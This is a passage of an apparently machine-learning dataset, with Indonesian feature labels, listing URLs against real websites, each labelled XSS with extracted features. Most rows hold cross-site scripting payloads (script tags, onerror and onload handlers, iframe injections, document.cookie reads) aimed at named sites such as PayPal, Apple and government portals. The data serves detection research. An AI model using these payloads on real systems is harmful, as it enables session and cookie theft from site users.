ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.titivillus.it/periodico.php?id=15%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.toolboxrecords.com/fr/search//\"\"><script>alert('Xss+By+Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.torrents.net/find/\"\"><script>alert('Xss By Atm0n3r')</script>/\";Antara 54 dan 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.totallyspies.com/_php/index.php?lang=uk\"\");alert(\"\"xss\"\");//\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.tradeindia.com/search/product_search.html?search_form_id=18&keyword=%22/%3E%3Cscript%3Ealert(%22Xss%20:%20Vijayendra%22)%3C/script%3E&criteria=product&submit.x=0&submit.y=0;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.travbuddy.com/register.php?mapid=\"\"><script>alert(1);</script>\";Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.truste.com/blog/2012/001/30/google-competing-on-privacy/%3Cbody%20onload=alert%28%22RM%22%29%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.tutorialsscripts.com/free-php-scripts/form-session-cookie-script/get-date-from-form-using-post-method.php?username=%3Cscript%3Ealert%28%27hi%27%29%3B%3C%2Fscript%3E&email=hello%40slopsbox.com&is_username=on &submit=Submit;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.ucoatit.com/shop/error.asp?msg=<iframe src=\"\"http://XSSed.com\"\">\";Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.unet.univie.ac.at/~a0503736/php/drdoswiki/index.php?n=Main.WikiSandbox?from=%22/%3E%3Cbodyonload=alert(1)%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.universinet.it/components/com_feedpostold/feedpost.php?url=http://r14nulr00t.blogspot.com;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.utsc.utoronto.ca/~registrar/calendars/calendar04/search.cgi?search=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharC ode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Ba lert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Eale rt%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E&formid=Search&wordsearch=0;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.vatican.va/redemptoris_mater/flash/index.html?lingua=it%22----%3E%3E''%3E%3Cscript%3Ealert('XSS')%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.venstre.dk/soegning/?tx_indexedsearch%5B_freeIndexUid%5D=_&tx_indexedsearch%5Bpointer%5D=0&tx_indexedsearch%5Bext%5D=1&tx _indexedsearch%5BdefOp%5D=0&tx_indexedsearch%5Bsword%5D=%3Cscript%3Ealert%28%27xssed%27%29%3B%3C%2Fs cript%3E&tx_indexedsearch%5Bsubmit_button%5D=&tx_indexedsearch%5Bsections%5D=0&tx_indexedsearch%5Bre sults%5D=99999&tx_indexedsearch%5Bgroup%5D=sections;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.vienot.fr/index.php?n=Main.WikiSandbox?from=Main.WikiSandbox?from=%22/><bodyonload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.vip-dream.com/index.php?lang=fr/\"\"><script>alert('Xss By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.vr-gebrauchtwagen.de/cgi-bin/site_search.pl?search=%22%3E%3Cscript%3Ealert(navigator.userAgent)%3C/script%3E&GROUP=LANG_DE_GBW&HTML-NR=106;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.vtt.fi/personsearch/jsp/findperson.jsp?sn=%22%3E%3Ciframe%20src=%22http://xssed.com%22%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.wattpad.com/stories/search/a%2522%253E%253Cscript%253Ealert%28document.cookie%29%253C%252Fscript%253E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.weather.com/outlook/recreation/outdoors/search?where=%3Cbody+onload%3Dalert%28%27XSS%27%29%3E&start_with=1&search_loc_type=13&x=24&y=12;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.weather.com/search/enhanced?what=Weather36HourBusinessTravelerCommand&config=SZ=160x600*WX=FHW*LNK=SSNL*UNT=F*BGI=winter*MAP=null|null*DN=www.webhackdesigns.com*TIER=0*PID=1054060864*MD5=da536c3570c12825843d811c6ea7cd31&par=WOWs0_1054060864&site=160x600&cm_ven=WOWs0&cm_cat=160x600&code=link&promo=searchbox&cm_ite=link&cm_pla=searchbox&where='%22%3E%3Ciframe%20src=http://thehacking.org/%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.wetter.de/shared/php/search_plz_ort.php?in=%253C%2500%253Cscript%253Ealert%28navigator.userAgent%29%253C/script%253E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.wilderssecurity.com/sendmessage.php?s=&do=docontactus&url=index.php&name=&email=&gquestion1=%22%3E%3Cimg+src%3Da+onerror%3Dalert%28Strin g.fromCharCode%2888%2C83%2C83%29%29%3E%3C&gquestion2=&gquestion3=&subject=0&other_subject=&message=;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.windows7download.com/software-search.html?keywords=%22%27%3E%3C/title%3E%3Cimg%20hidden=true%20src=x%20onerror=alert%28%27XSSED%27%29%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.wolframalpha.com/input/?i=mandelbrot&a=*C.mandelbrot-_*Formula.dflt-&f2=-0.5&f=MandelbrotSet.rec_-0.5&f3=666&f=MandelbrotSet.imc_666%22%20alt=%22MandelbrotSet.imc%22%20%20name=f3%20/%3E%3Cbody%20onload=alert(%22XSS%22)%3E%3Cspan;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.xe.gr/search?System.type=xe_stelexos&Publication.freetext=<iframe src=\"\"http://xssed.com\"\">\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.xl.pt/cgi-bin/pesquisa/maximainteriores.cgi?pesquisar=%3E%22%3E%3Ciframe+src%3D%22http%3A%2F%2Fxssed.com%22%3E&image.x=42&image.y=9&image=submit;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.xl.pt/cgi-bin/pesquisa/semanainformatica.cgi?site2=semanainformatica&obrigado2=http%3A%2F%2Fsemanainformatica.xl.pt%2Fnewsletter%2Fobrigado.shtml &pesquisar=%3E%22%3E%3Ciframe+src%3D%22http%3A%2F%2Fxssed.com%22%3E&image2.x=25&image2.y=17&image2=submit;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.yatashomeaydin.com/tr/urunlerimiz_detay.php?idurun=\"\"><script>alert(1)</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.yeeongems.com/product_detail.php?ID=5&CatID=\"\"><script>alert(1)</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.yemen.gov.ye/portal/gov/%D8%A7%D9%84%D8%A3%D8%AE%D8%A8%D8%A7%D8%B1/tabid/959/mid/3178/Default.aspx?SearchTerm=%3Cimg%20src=%27aaa%27%20onerror=alert%281%29%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.yesser.gov.sa/custompages/rssfeed.aspx?src=%3CScript%3Ealert(%27Nemer%20Al%20Nemer%20must%20be%20free%27)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www2.acer.co.in/support/support_network_display.asp?type=City&city=%22--%3E%3Cscript%3Ealert%28/XSS/%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://xakep.ru/local/search/result.asp?tosearch=%3C/title%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://xfinity.comcast.net/news/national/%27%3C/script%3E%3Cscript%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/script%3E/;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://yucie.twbbs.org/pmwiki/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://zwily.com/iphoto/wiki/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"https://apply.mcdonalds.com.au/public/index.cfm?action=applicantLogin&returnTo=/%22%3E%3C/object%3E%3C/script%3E%3C/title%3E%3Cimg%20src=1%20onerror=alert%281337%29%3E&Share|LikenSnoopy%20and%20Slice228%20like%20this.wWw.Scoala-De-Soferi.hi2.RoQuick%20reply%20to%20this%20message%20Reply%20%20%20Reply%20With%20Quote%20Reply%20With%20Quote%20%20%20Multi-Quote%20This%20MessageRe:%20[Xss]%20McDonalds01-04-2012,%2008:47%20AM%20#2pr0totypEpr0totypE%20is%20offlineRegistered%20user%20Bautor%20de%20bere%20Array%20pr0totypE%27s%20AvatarJoin%20DateNov%202011LocationYou%20can%27t%20find%20me;%20I%20can%20only%20find%20you.......Certainly%20is%20that%20CHUCK%20NORRIS%20can%20find%20us%20both%20:%29%29%29Posts37Rep%20Power0Send%20a%20message%20via%20Yahoo%20to%20pr0totypEDefaultCe%20face?%20E%20doar%20un%20link%20spre%20o%20pagina%20cu%20angajari%20de%20la%20Mac?Share|LikeNu%20sunt%20foarte%20inteligent,%20dar%20sunt%20pe%20cat%20se%20poate%20de%20corect.[TuToriaL%20FlooD%20IP]Quick%20reply%20to%20this%20message%20Reply%20%20%20Reply%20With%20Quote%20Reply%20With%20Quote%20%20%20Multi-Quote%20This%20MessageRe:%20[Xss]%20McDonalds01-04-2012,%2009:53%20AM%20#3GeckoGecko%20is%20online%20nowDesigner%20Cultul%20betivilor%20Array%20Gecko%27s%20AvatarJoin%20DateMar%202011LocationLocation,%20location,%20location...Posts1,182Rep%20Power2DefaultQuote%20Originally%20Posted%20by%20pr0totypE%20View%20PostCe%20face?%20E%20doar%20un%20link%20spre%20o%20pagina%20cu%20angajari%20de%20la%20Mac?Printr-un%20atac%20XSS%20poti%20injecta%20cod%20javascript%20in%20o%20pagina%20web%20direct%20in%20address%20bar.%20Majoritatea%20oamenilor%20folosesc%20acest%20atac%20pentru%20a%20fura%20parolele%20salvate%20in%20calculatoarelor%20victimelor.Acel%20onerror=%22alert%281337%29%22%20executa%20cod%20JavaScript.Share|Like%22Take%20your%20time%20and%20do%20your%20best!%22Quick%20reply%20to%20this%20message%20Reply%20%20%20Reply%20With%20Quote%20Reply%20With%20Quote%20%20%20Multi-Quote%20This%20MessageRe:%20[Xss]%20McDonalds01-04-2012,%2009:54%20AM%20#4pr00fpr00f%20is%20offlineRegistered%20user%20Bautor%20de%20absinth%20ArrayJoin%20DateDec%202010Posts765Rep%20Power3DefaultQuote%20Originally%20Posted%20by%20pr0totypE%20View%20PostCe%20face?%20E%20doar%20un%20link%20spre%20o%20pagina%20cu%20angajari%20de%20la%20Mac?Cross-site%20scripting%20-%20Wikipedia,%20the%20free%20encyclopediaIgnoran%C8%9Ba%20nu%20aduce%20cuno%C8%99tin%C8%9Be.%20Precum%20%C8%99i%20fonturile%20colorate.Share|LikeYour%20mother%20is%20so%20fat,%20the%20recursive%20function%20computing%20her%20mass%20causes%20a%20stack%20overflow.Quick%20reply%20to%20this%20message%20Reply%20%20%20Reply%20With%20Quote%20Reply%20With%20Quote%20%20%20Multi-Quote%20This%20Message\";Lebih dari 75;Terdapat port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Terdapat EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttps://careerlaunch.jpl.nasa.gov/ci20/index.jsp?applicationName=%22%3E%3Cimg%20src=http://i48.tinypic.com/dw5dkz.png%3E%3C/img%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttps://cms.paypal.com/cms_content/US/en_US/files/marketing_us/pp101_HowPPWorks_player.swf?config=%3CIMG%20SRC=%22http://demo.offcon.org/test.PNG%22%3E&debug=false;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"https://dx.com/s/car.html?GEPrice=1.00&LEPrice=\"\" onmouseover=\"\"alert(123)\"\" x=\"\"HOVER THE RELEASE DATELINKS DOWN TO THE LEFT&category=712\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttps://elibrary2.eosintl.com/P94008Staff/OPAC/MyAccount/Signin.asp?SavePwd=0&UserID=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String .fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F %5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSC RIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttps://extranet.biskot.com/login.php?valid=1&page=%2F&email=%2F%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&pwd=%2F%22%3E%3Cscript%3Eale rt%281%29%3C%2Fscript%3E&x=23&y=9;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttps://hire.jobvite.com/Login/Login.aspx?PageData=&__EVENTTARGET=LoginButton&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTU4ODA5Mjg0OWQYAQUeX19Db 250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgIFCUF1dG9Mb2dpbgUHU3VibWl0MQ%3D%3D&__EVENTVALIDATION=%2FwEWAgKu voTcBwL26uW2Ag%3D%3D&UserName=%22%3E%3Cscript%3Ealert%28%22xss+vulnerability%22%29%3B%3C%2Fscript%3E &Password=%22%3E%3Cscript%3Ealert%28%22xss+vulnerability%22%29%3B%3C%2Fscript%3E&recaptcha_response_ field=;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"https://hosting.html.com/cgi-bin/wairs/signup.cgi?changeme=&showLanguage=&languageSelect=en&pageid=index&dname=\"\">&tldSe lect=.ca\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttps://iclass.eccouncil.org/?fontstyle=%22onmouseover=alert%28/XSS/%29%20%22;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttps://idp.godaddy.com/login.aspx?ci=10530&spkey=GDSWNET-P3PWCORPWEB137&redirect=true&target=http://www.xssed.com;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"https://locate.apple.com/sales/?sales-products=all&location='\"\"><script>alert('XSS')</script>&isStreetAddress=false\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttps://mep.pandasecurity.com/?action=rememberPassword&login=gjuipqgc&userKind=%22%3E%3Ciframe%20onload=alert%28/XSS/%29%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttps://myonlineaccounts2.abbeynational.co.uk/CentralLogonWeb/Logon?action=prepare&personalID=%22%3E%3Cscript%3Ealert(123)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"https://profile.callofduty.com/p/login.act?redirectUrl=%22;%20alert%28%22XSS%20By%20SquirmyBeast%22%29;%20XSS=%22Fuck%20Yeah;\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttps://register.dailymail.co.uk/doRegisterCutDown?email=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttps://remote.utorrent.com/send?btih=6BD53DF2D2528D6A10C6A8DA457CAE38A522695C&dn=%3Cimg%20src=%22http://i40.tinypic.com/125l7ja.jpg%22%20/%3E&message=;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada 